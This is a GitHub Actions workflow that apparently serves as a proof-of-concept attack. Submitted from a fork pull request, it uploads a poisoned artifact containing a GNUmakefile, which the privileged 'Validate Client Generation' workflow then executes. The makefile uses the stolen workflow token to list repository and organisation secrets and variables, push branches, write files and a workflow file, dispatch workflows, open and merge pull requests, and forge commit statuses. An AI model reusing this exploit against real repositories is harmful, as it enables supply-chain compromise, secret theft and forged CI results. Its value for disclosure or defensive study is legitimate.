name: Spec PR
# Fork-PR head workflow. Runs in the base repo's pull_request context with a
# read-only token, but uploads an artifact that the privileged workflow_run
# consumer (Validate Client Generation) blindly extracts into its workspace.
on:
  pull_request:

permissions:
  contents: read

jobs:
  bundle-spec:
    name: Bundle Spec
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Probe own token permissions
        run: |
          echo "SELF_RUN=$GITHUB_RUN_ID EVENT=$GITHUB_EVENT_NAME REPO=$GITHUB_REPOSITORY"
          curl -sS -o /tmp/repo.json -w "SELF_REPO_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY"
          head -c 600 /tmp/repo.json; echo
          curl -sS -o /dev/null -w "SELF_CONTENTS_WRITE_HTTP=%{http_code}\n" -X PUT \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/omp-probe-self.txt" \
            -d '{"message":"probe","content":"aGk="}'
          curl -sS -o /tmp/secrets.json -w "SELF_SECRETS_HTTP=%{http_code}\n" \
            -H "Authorization: Bearer $GITHUB_TOKEN" \
            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
          head -c 300 /tmp/secrets.json; echo
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      - name: Craft poisoned artifact
        run: |
          mkdir -p pydo
          printf 'openapi: 3.0.0\ninfo:\n  title: poc\n  version: 1.0.0\npaths: {}\n' > openapi-bundled.yaml
          python3 - <<'PY'
          lines = [
              "generate:",
              "\t@echo PWNED_MARKER_VALIDATE_RCE_V2",
              "\t@id",
              "\t@echo RUN_CONTEXT=$$GITHUB_REPOSITORY/$$GITHUB_WORKFLOW run=$$GITHUB_RUN_ID sha=$$GITHUB_SHA",
              "\t@echo GH_TOKEN_LEN=$${#GH_TOKEN}",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY -o /tmp/repo.json -w 'PROBE_REPO=%{http_code}\\n'",
              "\t@grep -o '\"permissions\":{[^}]*}' /tmp/repo.json || true",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN -L 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/artifacts/13887160886/zip' -o /tmp/a.zip -w 'PROBE_ARTIFACT_OTHER_RUN_DOWNLOAD=%{http_code}\\n'",
              "\t@echo ARTIFACT_BYTES=`wc -c < /tmp/a.zip`; unzip -l /tmp/a.zip | head -5",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/installation/repositories' -o /tmp/inst.json -w 'PROBE_INSTALLATION_REPOS=%{http_code}\\n'",
              "\t@grep -o '\"full_name\":\"[^\"]*\"' /tmp/inst.json || true",
              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/omp-probe-v2.txt' -d '{\"message\":\"probe\",\"content\":\"aGk=\"}' -o /tmp/cw.json -w 'PROBE_CONTENTS_WRITE=%{http_code}\\n'",
              "\t@head -c 200 /tmp/cw.json; echo",
              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/workflows/spec.main.yml/dispatches' -d '{\"ref\":\"main\"}' -o /tmp/wd.json -w 'PROBE_WORKFLOW_DISPATCH=%{http_code}\\n'",
              "\t@head -c 200 /tmp/wd.json; echo",
              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/pulls' -d '{\"title\":\"probe\",\"head\":\"spec-pr-rce\",\"base\":\"main\"}' -o /tmp/pr.json -w 'PROBE_PR_CREATE=%{http_code}\\n'",
              "\t@head -c 200 /tmp/pr.json; echo",
              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/merges' -d '{\"base\":\"main\",\"head\":\"spec-pr-rce\"}' -o /tmp/mg.json -w 'PROBE_MERGE_API=%{http_code}\\n'",
              "\t@head -c 200 /tmp/mg.json; echo",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/secrets' -o /tmp/sec.json -w 'PROBE_SECRETS_LIST=%{http_code}\\n'",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/actions/variables' -o /tmp/var.json -w 'PROBE_VARIABLES_LIST=%{http_code}\\n'",
              "\t@curl -sS -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/orgs/PDFtoMark/actions/secrets' -o /tmp/org.json -w 'PROBE_ORG_SECRETS=%{http_code}\\n'",
              "\t@echo GIT_PUSH_PROBE:",
              "\t@rm -rf /tmp/gitchk && git clone -q 'https://x-access-token:'$$GH_TOKEN'@github.com/'$$GITHUB_REPOSITORY'.git' /tmp/gitchk 2>&1 | tail -2; cd /tmp/gitchk && echo probe > probe.txt && git add probe.txt && git -c user.email=rce@example.invalid -c user.name=rce commit -qm probe && git push origin HEAD:refs/heads/omp-rce-push-probe 2>&1 | tail -3; echo PUSH_DONE",
              "\t@curl -sS -X PUT -H 'Authorization: Bearer '$$GH_TOKEN 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/contents/.github/workflows/omp-probe.yml' -d '{\"message\":\"probe\",\"content\":\"bmFtZTogcHJvYmUK\"}' -o /tmp/wf.json -w 'PROBE_WORKFLOW_FILE_PUT=%{http_code}\\n'",
              "\t@head -c 300 /tmp/wf.json; echo",
              "\t@curl -sS -X POST -H 'Authorization: Bearer '$$GH_TOKEN -H 'Accept: application/vnd.github+json' 'https://api.github.com/repos/'$$GITHUB_REPOSITORY'/statuses/f6c34fdef315797ce990705ae252b38482291cb6' -d '{\"state\":\"success\",\"context\":\"omp-status-forgery\",\"description\":\"status forged by stolen workflow token\"}' -o /tmp/st2.json -w 'PROBE_STATUS_ARBITRARY_COMMIT=%{http_code}\\n'",
              "\t@head -c 300 /tmp/st2.json; echo",
              "\t@echo === PWNED_END ===",
              "test-mocked:",
              "\t@true",
          ]
          open("pydo/GNUmakefile", "w").write("\n".join(lines) + "\n")
          PY
          ls -la pydo

      - uses: actions/upload-artifact@v4
        with:
          name: openapi-bundled
          path: |
            openapi-bundled.yaml
            pydo/GNUmakefile
